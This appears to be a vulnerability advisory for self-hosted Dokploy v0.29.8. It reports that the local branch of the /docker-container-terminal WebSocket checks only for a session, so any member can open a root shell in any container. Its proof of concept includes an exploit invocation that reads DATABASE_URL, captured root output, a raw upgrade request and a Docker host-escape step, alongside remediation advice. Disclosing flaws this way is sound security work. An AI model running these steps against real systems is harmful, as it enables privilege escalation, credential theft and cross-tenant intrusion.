repo.description: Hi Team! --- ## 1. Summary The WebSocket endpoint `/docker-container-terminal` opens an interactive terminal (`docker exec -it -w / `) into a container. The **local branch** (no `serverId` supplied) authorizes the connection with **only** `if (!user || !session) ws.close()` - it never checks the user's role, organization, or whether the user owns/has access to the target container. The `containerId` is attacker-controlled (format-validated only). As a result, any authenticated user - including the lowest-privilege **`member`** role, which has no docker or terminal permissions - can open a root shell in **any container on the host**: the platform postgres container, the Dokploy server itself, and other organizations' application containers. This leaks the platform database credentials, secrets, and breaks tenant isolation. The remote branch (`serverId` supplied) is correctly org-scoped; only the local branch is broken. > Self-hosted only: the local branch is gated by `IS_CLOUD` (line 149) and returns "not available in the cloud version." Dokploy Cloud is not affected by this specific branch. ## 1b. Relationship to CVE-2026-24841 (distinct, still-live bug) CVE-2026-24841 (fixed in `0.26.6`) was a **command-injection** (CWE-78) on this same endpoint - shell metacharacters in `containerId`/`activeWay` reaching a shell. That fix added `isValidContainerId` / `isValidShell` format validators and an array-args `spawn` (no shell). **This advisory is a different bug class on the same endpoint: CWE-862 missing authorization**, not injection. The target here is `v0.29.8` - **post both** the CVE-2026-24841 fix **and** commit `018e2b153` ("fix: add cross-org ownership checks to ... WebSocket endpoints", 2026-04-24). The PoC uses a clean container name (`dokploy-poc`) with **no metacharacters**, so it bypasses none of the injection mitigations - it relies purely on the missing authz. The injection vector is closed; the authorization gap is not. **Incomplete fix:** commit `018e2b153` added `server.organizationId !== session.activeOrganizationId` to the **remote (`serverId`) branch** of this endpoint - but did **not** touch the **local (`else`) branch**, which still authorizes with only `if (!user || !session) ws.close()`. The maintainer applied cross-org ownership scoping to the SSH path and missed the local docker-exec path. This report is that remaining gap. ## 2. Vulnerable code `apps/dokploy/server/wss/docker-container-terminal.ts` ```ts wss.on("connection", async (ws, req) => { const containerId = url.searchParams.get("containerId"); const activeWay = url.searchParams.get("activeWay"); const serverId = url.searchParams.get("serverId"); const { user, session } = await validateRequest(req); if (!containerId) { ws.close(4000, "containerId not provided"); return; } if (!isValidContainerId(containerId)) { ws.close(4000, "Invalid container ID format"); return; } if (activeWay && !isValidShell(activeWay)) { ws.close(4000, "Invalid shell specified"); return; } const shell = activeWay || "sh"; if (!user || !session) { ws.close(); return; } // <-- ONLY auth check (line 57) try { if (serverId) { const server = await findServerById(serverId); if (server.organizationId !== session.activeOrganizationId) { ws.close(); return; } // scoped ...SSH exec... } else { if (IS_CLOUD) { ws.send("This feature is not available in the cloud version."); ws.close(); return; } const ptyProcess = spawn("docker", ["exec", "-it", "-w", "/", containerId, shell], {}); // <-- sink (line 154) ... } } }); ``` `isValidContainerId` (`apps/dokploy/server/wss/utils.ts:11`) only validates format - it accepts any container name `[a-zA-Z0-9][a-zA-Z0-9_.-]*` or hex id. It does **not** bind the container to the caller. ## 3. Root cause 1. The local branch performs no authorization beyond "has a session." There is no `checkPermission`, no role check, no `organizationId` comparison, and no container ownership/membership check. 2. `containerId` is taken directly from the query string and passed to `docker exec`, constrained only by a format regex - so the caller picks any container on the host. 3. The remote branch shows the developers knew org-scoping was needed (`server.organizationId !== session.activeOrganizationId`, line 65); the local branch was missed. ## 4. Proof of Concept ### 4.1 Contrast - the same `member` is denied on a normal privileged endpoint The `member` role has no `traefikFiles` permission, so a normal privileged tRPC call is correctly rejected: ```bash curl -s -b member.cookie -G $TARGET/api/trpc/settings.readTraefikFile \ --data-urlencode 'input={"json":{"path":"/etc/dokploy/traefik/dynamic.yml"}}' \ -w '\n[HTTP %{http_code}]\n' # -> 401 "unauthorized to access resource \"traefikFiles\"" ``` The WebSocket terminal in §4.2 accepts this same member session with **no** such check. ### 4.2 Exploit - the `member` opens a root shell in any container via WebSocket Reproducible exploit: `dokploy-wss1-exploit.sh` (wrapper) + `dokploy-wss1-client.mjs` (Node WS client). Captured evidence: `dokploy-wss1-evidence.md`. A `member` (base role, no terminal/docker permissions) signs in and connects: ``` WS_URL=ws://localhost:3000/docker-container-terminal?containerId=dokploy-poc&activeWay=sh \ COOKIE='better-auth.session_token=' \ COMMAND='id; whoami; hostname; env | grep -i DATABASE_URL; ls /etc/dokploy' \ node dokploy-wss1-client.mjs ``` Result (member session, container `dokploy-poc` - the Dokploy server): ``` [+] WS OPENED - server accepted the member session with NO role/org/ownership check. ===WSS1_MEMBER_PWNED=== uid=0(root) gid=0(root) groups=0(root) root 9e48b4b27680 DATABASE_URL=postgres://dokploy:@dokploy-pg:5432/dokploy applications logs monitoring schedules ssh traefik volume-backups ``` And against `dokploy-pg` (the platform postgres container) with the same member session: ``` uid=0(root) gid=0(root) ... root e1f08183a667 ``` The same member, with no elevated permissions, obtained **root** in both the platform database host and the Dokploy server, and leaked the database connection string. ### Manual request ```http GET /docker-container-terminal?containerId=&activeWay=sh HTTP/1.1 Host: Upgrade: websocket Connection: Upgrade Sec-WebSocket-Key: Sec-WebSocket-Version: 13 Cookie: better-auth.session_token= ``` The server upgrades and spawns `docker exec -it -w / sh`; stdin/stdout then flow over the WebSocket frames. Note: the `101 Switching Protocols` handshake completes for **any** request (authenticated or not) because `validateRequest` runs *after* the upgrade; the authorization gap is observable only by exchanging frames - an authenticated member session stays open and executes, an unauthenticated one is closed. So reproducing the exec requires a WebSocket client (the curl handshake alone is not the proof). ## 5. Impact - **Low-privilege escalation:** a `member` (or any authenticated user) escalates to **root inside arbitrary containers** on the host, including the platform database and the Dokploy server - reading DB credentials, application secrets, and the host config directory. - **Cross-tenant (multi-org self-hosted):** the local branch never compares `containerId` against the caller's organization. A member of org A can exec into org B's containers by supplying their container id/name, reading other tenants' code and secrets. **Tenant isolation break.** - **Host-root pivot:** the Dokploy server container itself is a reachable target and mounts the Docker socket; a member who gets root there can `docker run -v /:/host ...` to escalate to root on the underlying host - the same "complete infrastructure takeover" class as CVE-2026-24841, reached via missing authorization rather than injection. - **Persistence/lateral movement:** root in the Dokploy server container enables reading/writing `/etc/dokploy` (traefik configs, ssh keys, schedules) and modifying the platform from inside. - **Reachability:** the `member` role exists on every multi-user Dokploy instance (created via the standard invitation flow). No admin/owner access is required - this is a genuine low-privilege primitive, unlike admin-gated findings. ### 5.1 PoC images **Fig. 1** - Target identity: image `dokploy/dokploy:canary`, version `v0.29.8`, container healthy. **Fig. 2** - Attacker role in DB: `member@poc.local | member` (same org as `admin@poc.local | owner`). **Fig. 3** - The member is denied on a normal privileged endpoint: `401 "unauthorized to access resource \"traefikFiles\""`. **Fig. 4** - The SAME member via `/docker-container-terminal` → `uid=0(root)` in `dokploy-poc` + `DATABASE_URL` leak. **Fig. 5** - Cross-container: same member → `uid=0(root)` in `dokploy-pg` (different hostname) - arbitrary `containerId`. ## 6. Remediation Authorize the local branch the same way services are accessed elsewhere: 1. **Require container ownership/access.** Resolve the target container to a Dokploy service/application and call the existing `checkServicePermissionAndAccess(ctx, { serviceId, permission: "terminal" | "interact" })` (`packages/server/src/services/permission.ts`). Reject if the caller's organization does not own the container or lacks the relevant permission. 2. **Role-gate the terminal.** Ensure the caller's role grants terminal/exec permission (the base `member` role must NOT be able to exec into arbitrary containers). 3. **Do not trust `containerId` alone.** Map `containerId` -> service -> organization and scope by `session.activeOrganizationId`, mirroring the remote branch's `server.organizationId !== session.activeOrganizationId` check. 4. Consider whether the local "exec into any container" terminal should exist at all on multi-tenant hosts; if it does, confine it to containers owned by the caller's org. ## 7. References - Vulnerable endpoint: `apps/dokploy/server/wss/docker-container-terminal.ts:30-189` (auth check line 57, local sink line 154) - Format-only validator (CVE-2026-24841 mitigation): `apps/dokploy/server/wss/utils.ts:11-16` - Scoped remote branch (contrast - the branch `018e2b153` fixed): `docker-container-terminal.ts:62-65` - Incomplete-fix commit `018e2b153` (org check added to remote branch only): `git show 018e2b153 -- apps/dokploy/server/wss/docker-container-terminal.ts` - CVE-2026-24841 (command injection on same endpoint, fixed in 0.26.6) - distinct bug class from this advisory - RBAC (member has no terminal/docker perms): `packages/server/src/lib/access-control.ts:173` - Service access control helper: `packages/server/src/services/permission.ts:242-289` - Exploit: `dokploy-wss1-exploit.sh`, `dokploy-wss1-client.mjs` - Evidence: `dokploy-wss1-evidence.md` --- | Field | Value | |---|---| | **Title** | Missing authorization on `/docker-container-terminal` local branch - any authenticated user gets a shell in any container | | **Affected product** | Dokploy (self-hosted), canary branch, version `v0.29.8` (post CVE-2026-24841 fix `0.26.6`) | | **Affected component** | `apps/dokploy/server/wss/docker-container-terminal.ts` (local branch, `else` at line 148) | | **Severity** | **High** (low-priv authenticated -> root in arbitrary containers, cross-tenant) | | **CVSS 3.1** | **8.8 High** - `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` (9.9 Critical, `S:C`, for multi-tenant deployments) | | **Affected versions** | All versions since the local terminal branch was introduced (monorepo, commit `5280c861e`) through `v0.29.8` | | **Patched version** | None - unpatched as of `v0.29.8` | | **Auth required** | Yes - any authenticated account, including the base **`member`** role (no docker/terminal permissions) | | **Impact** | Container escape-equivalent access: root shell in any container on the host; read platform DB credentials, secrets, and other tenants' containers | | **CWE** | CWE-862 (Missing Authorization) - (related: CWE-284 Improper Access Control) | | **OWASP** | A01:2021 Broken Access Control | | **Vector** | Authenticated WebSocket upgrade to `/docker-container-terminal` (no `serverId`, no shell metacharacters) | | **Date** | 2026-06-27 |
repo.summary: Dokploy Broken Access Control on docker-container-terminal WebSocket (Member -> Root in Arbitrary Containers)
